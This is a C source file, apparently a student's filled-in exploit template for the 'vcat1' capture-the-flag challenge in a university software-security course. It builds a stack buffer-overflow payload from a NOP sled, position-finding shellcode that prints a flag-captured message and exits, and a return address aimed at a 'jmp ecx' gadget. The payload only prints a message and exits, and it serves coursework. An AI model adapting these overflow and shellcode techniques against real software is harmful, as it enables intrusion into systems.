/*
 * CTF-1 `vcat1' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>


/* FIXME */
// Shell code takes up 147 characters (bytes)
// Buffer is 0x108 (264) bytes below %ebp
unsigned char payload[] =
	// How many nops can we fit? A LOT.
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	// 50 Nops in each section
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	// And an additional 14 here to get up to %ebp
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90"
	"\x90\x90\x90"

	/* ------------------------------------	*/
	"\x8b\x5c\x24\xfc"		/*[-_^]	*/
	"\xeb\x03"			/* M	*/
	"\x58"				/* A	*/
	"\xeb\x05"			/* G	*/
	"\xe8\xf8\xff\xff\xff"		/* I	*/
	"\x2c\x0e"			/* C	*/
	"\x39\xc4"			/*[^_-]	*/
	/* ------------------------------------	*/
	 "\x83\xc4\x40"	/* add $0x40, %esp	*/ //(Removed for flag 6)
	/* ------------------------------------	*/
	/*
	 * push
	 * "\n[+] w00t!\n[+] Congratulations, you captured 'Flag 4/5/6'!\n\0"
	 */
	
	//"\x68" "\x27\x21\x0a\x00" Push 0xa2127
	// Pushes a larger value into the register, then subtracts it (takes up 7 more bytes)
	"\x9f"
	"\xba\x28\x22\x1a\x01"
	"\x81\xea\x01\x01\x10\x01"
	"\x52"
	"\x9e"

	"\x75\x07"
	"\x68" "\x61\x67\x20\x36"
	"\xeb\x1f"
	"\x39\xc3"
	"\x74\x16"
	"\x39\xcb"
	"\x74\x12"
	"\x80\x3b\x90"
	"\x75\x0d"
	"\x80\x7b\xff\x90"
	"\x75\x07"
	"\x68" "\x61\x67\x20\x35"
	"\xeb\x05"
	"\x68" "\x61\x67\x20\x34"
	"\x68" "\x20\x27\x46\x6c"
	"\x68" "\x75\x72\x65\x64"
	"\x68" "\x63\x61\x70\x74"
	"\x68" "\x79\x6f\x75\x20"
	"\x68" "\x6e\x73\x2c\x20"
	"\x68" "\x61\x74\x69\x6f"
	"\x68" "\x61\x74\x75\x6c"
	"\x68" "\x6f\x6e\x67\x72"
	"\x68" "\x2b\x5d\x20\x43"
	"\x68" "\x74\x21\x0a\x5b"
	"\x68" "\x20\x77\x30\x30"
	"\x68" "\x0a\x5b\x2b\x5d"
	"\x89\xe1"	/* mov    %esp, %ecx	*/
	"\x6a\x38"	/* push   $0x38		*/ /* sizeof(str)		*/
	"\x5a"		/* pop    %edx		*/
	"\x6a\x01"	/* push   $0x1		*/ /* write(...)		*/
	"\x5b"		/* pop    %ebx		*/ /* arg0: STDOUT_FILENO	*/
	"\x6a\x04"	/* push   $0x4		*/ /* arg1: &"\n..."		*/
	"\x58"		/* pop    %eax		*/ /* arg2: sizeof(str)		*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	//"\x6a\x00"	/* push   $0x0		*/
	//"\x5b"		/* pop    %ebx		*/
	"\x87\xde" // Uses another register
	"\x6a\x01"	/* push   $0x1		*/ /* exit(EXIT_SUCCESS)	*/
	"\x58"		/* pop    %eax		*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	// Put the address of the buffer here (we think)
	"\x3d\x5f\xe8\xc5"
	// esp after returing is 0xBFFFB700

	// 0xb5e85f3d is start of text section in memory for vcat1
	// 0x14e4d is offset for "ff e1" (the jump ecx command)
	;

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
